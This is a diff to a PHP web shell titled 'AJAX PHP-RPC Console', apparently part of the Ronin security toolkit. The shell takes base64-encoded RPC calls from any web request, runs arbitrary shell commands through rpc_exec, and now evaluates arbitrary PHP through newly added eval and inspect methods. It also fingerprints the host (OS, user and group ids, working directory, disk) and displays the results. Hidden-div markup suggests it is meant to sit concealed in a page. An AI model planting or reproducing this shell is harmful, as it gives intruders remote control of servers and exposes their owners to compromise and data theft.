@@ -20,12 +20,47 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 #
 
+function running($params=array())
+{
+  return true;
+}
+
+function fingerprint($params=array())
+{
+  $profile = array(
+    'os' => PHP_OS,
+    'system_name' => php_uname('s'),
+    'system_release' => php_uname('r'),
+    'system_version' => php_uname('v'),
+    'machine_type' => php_uname('m'),
+    'host_name' => php_uname('n'),
+    'php_server_api' => php_sapi_name(),
+    'php_version' => phpversion(),
+    'uid' => posix_getuid(),
+    'gid' => posix_getgid(),
+    'cwd' => getcwd(),
+    'disk_free_space' => disk_free_space('/'),
+    'disk_total_space' => disk_total_space('/')
+  );
+
+  switch ($profile['php_server_api'])
+  {
+  case 'apache':
+    $profile['apache_version'] = apache_get_version();
+    break;
+  }
+
+  return $profile;
+}
+
 function rpc_method_proxy($method,$arguments,$server)
 {
   $session = array_shift($arguments);
   $func = $server->methods[$method];
 
   $server->load_session($session);
+
+  ob_start();
 
   if (is_array($func))
   {
@@ -36,9 +71,16 @@ function rpc_method_proxy($method,$arguments,$server)
     $ret = $func($arguments);
   }
 
+  $output = ob_get_contents();
+  ob_end_clean();
+
   $new_session = $server->save_session();
 
-  return array('session' => $new_session, 'return_value' => $ret);
+  return array(
+    'session' => $new_session,
+    'output' => $output,
+    'return_value' => $ret
+  );
 }
 
 class RPCServer
@@ -145,7 +187,8 @@ class ConsoleService extends Service
     $this->includes = array();
     $this->methods = array(
       'invoke' => 'rpc_invoke',
-      'fingerprint' => 'rpc_fingerprint'
+      'eval' => 'rpc_eval',
+      'inspect' => 'rpc_inspect'
     );
 
     $this->persistant = array('includes');
@@ -165,7 +208,8 @@ class ConsoleService extends Service
       }
     }
 
-    $call_string = "return {$name}(" . join($call_arguments, ", ") . ");";
+    $call_string = "return {$name}(" . join(", ", $call_arguments) . ");";
+
     $ret = eval($call_string);
 
     if (($name == 'include' || $name == 'require') && $ret != false)
@@ -176,32 +220,28 @@ class ConsoleService extends Service
     return $ret;
   }
 
-  function rpc_fingerprint($params)
+  function rpc_eval($params)
   {
-    $profile = array(
-      'os' => PHP_OS,
-      'system_name' => php_uname('s'),
-      'system_release' => php_uname('r'),
-      'system_version' => php_uname('v'),
-      'machine_type' => php_uname('m'),
-      'host_name' => php_uname('n'),
-      'php_server_api' => php_sapi_name(),
-      'php_version' => phpversion(),
-      'uid' => posix_getuid(),
-      'gid' => posix_getgid(),
-      'cwd' => getcwd(),
-      'disk_free_space' => disk_free_space('/'),
-      'disk_total_space' => disk_total_space('/')
-    );
+    $code = trim($params[0]);
 
-    switch ($profile['php_server_api'])
+    if ($code[strlen($code) - 1] != ';')
     {
-      case 'apache':
-        $profile['apache_version'] = apache_get_version();
-        break;
+      $code .= ';';
     }
 
-    return $profile;
+    return eval("return " . $code);
+  }
+
+  function rpc_inspect($params)
+  {
+    $ret = $this->rpc_eval($params);
+
+    ob_start();
+    print_r($ret);
+    $output = ob_get_contents();
+    ob_end_clean();
+
+    return $output;
   }
 }
 
@@ -277,14 +317,14 @@ class ShellService extends Service
     }
   }
 
-  function rpc_cwd($arguments)
+  function rpc_cwd($params=array())
   {
     return $this->cwd;
   }
 
-  function rpc_cd($arguments)
+  function rpc_cd($params)
   {
-    $new_cwd = $arguments[0];
+    $new_cwd = $params[0];
 
     if ($new_cwd[0] != DIRECTORY_SEPARATOR)
     {
@@ -302,32 +342,32 @@ class ShellService extends Service
     return false;
   }
 
-  function rpc_env($arguments)
+  function rpc_env($params=array())
   {
     return $this->env;
   }
 
-  function rpc_getenv($arguments)
+  function rpc_getenv($params)
   {
-    return $this->env[$arguments[0]];
+    return $this->env[$params[0]];
   }
 
-  function rpc_setenv($arguments)
+  function rpc_setenv($params)
   {
-    return $this->env[$arguments[0]] = $arguments[1];
+    return $this->env[$params[0]] = $params[1];
   }
 
-  function rpc_exec($arguments)
+  function rpc_exec($params)
   {
     $command = 'cd ' . $this->cwd . '; ';
 
-    if (count($arguments) > 1)
+    if (count($params) > 1)
     {
-      $command .= array_shift($arguments) . ' ' . $this->format($arguments);
+      $command .= array_shift($params) . ' ' . $this->format($params);
     }
     else
     {
-      $command .= $arguments[0];
+      $command .= $params[0];
     }
 
     $command .= '; pwd';
@@ -339,17 +379,13 @@ class ShellService extends Service
   }
 }
 
-function rpc_test()
-{
-  return true;
-}
-
 if (isset($_REQUEST['rpc_call']))
 {
   $server = new RPCServer();
+  $server->register_method('running', 'running');
+  $server->register_method('fingerprint', 'fingerprint');
   $server->register_service('console', new ConsoleService());
   $server->register_service('shell', new ShellService());
-  $server->register_method('test', 'rpc_test');
 
   $xml = base64_decode(rawurldecode($_REQUEST['rpc_call']));
   $response = $server->call_method($xml);
@@ -359,7 +395,7 @@ if (isset($_REQUEST['rpc_call']))
 }
 else
 {
-  echo("</html>\n");
+  echo("<div style=\"display: none;\">--></div>\n</div>\n</html>\n");
 }
 
 ?>
@@ -367,7 +403,7 @@ else
 <html>
   <head>
     <title>Ronin::PHP - AJAX PHP-RPC Console</title>
-    <link rel="stylesheet" type="text/css" href="http://ronin.rubyforge.org/dist/php/rpc/ajax/css/layout.css" />
+    <link rel="stylesheet" type="text/css" href="http://ronin.rubyforge.org/dist/php/rpc/ajax/css/layout.css">
     <script type="text/javascript" src="http://ronin.rubyforge.org/dist/php/rpc/ajax/js/base64.js"></script>
     <script type="text/javascript" src="http://ronin.rubyforge.org/dist/php/rpc/ajax/js/jquery-1.2.6.min.js"></script>
     <script type="text/javascript" src="http://ronin.rubyforge.org/dist/php/rpc/ajax/js/jquery-ui-personalized-1.5.2.min.js"></script>
@@ -377,14 +413,23 @@ else
 
     <script type="text/javascript" language="javascript">
       $(document).ready(function() {
-        $("#console_tabs > ul").tabs();
         $("#console_shell").terminal(function(input) {
           shell.exec(input);
         });
 
+        $("#console_php").terminal(function(input) {
+          php.inspect(input);
+        });
+
+        $("#console_tabs > ul").tabs({
+          fx: { height: 'toggle' },
+          show: function(ui) {
+            $("input", ui.panel).focus();
+          }
+        });
         $("#console_title").hide();
 
-        $("#console_title").fadeIn(1500, function() {
+        $("#console_title").fadeIn(1300, function() {
           $("#console_shell").terminalFocus();
         });
       });
@@ -393,26 +438,30 @@ else
 
   <body>
     <div id="console_container">
-      <h1 id="console_title">AJAX PHP-RPC Console v0.9</h1>
+      <h1 id="console_title">AJAX PHP-RPC Console v1.0</h1>
 
       <div id="console_content">
         <div id="console_tabs">
           <ul>
-            <li><a href="#console_shell"><span>Console</span></a></li>
-            <li><a href="#console_info"><span>Fingerprint</span></a></li>
+            <li><a href="#console_shell"><span>Shell</span></a></li>
+            <li><a href="#console_php"><span>PHP</span></a></li>
+            <li><a href="#console_fingerprint"><span>Fingerprint</span></a></li>
           </ul>
 
           <div id="console_shell" class="console_tab"></div>
 
-          <div id="console_info" class="console_tab">
+          <div id="console_php" class="console_tab"></div>
+
+          <div id="console_fingerprint" class="console_tab">
             <div class="console_dialogue">
-              <p>
-              PHP Version: <br />
-              PHP Process ID: <br />
-              PHP Current Working Directory: <br />
-              PHP User ID: <br />
-              PHP Group ID: 
-              </p>
+<?php
+  $info = fingerprint();
+
+  foreach($info as $name => $value)
+  {
+    echo("<p><strong>" . str_replace('_', ' ', $name) . ":</strong> $value</p>\n");
+  }
+?>
             </div>
           </div>
         </div>
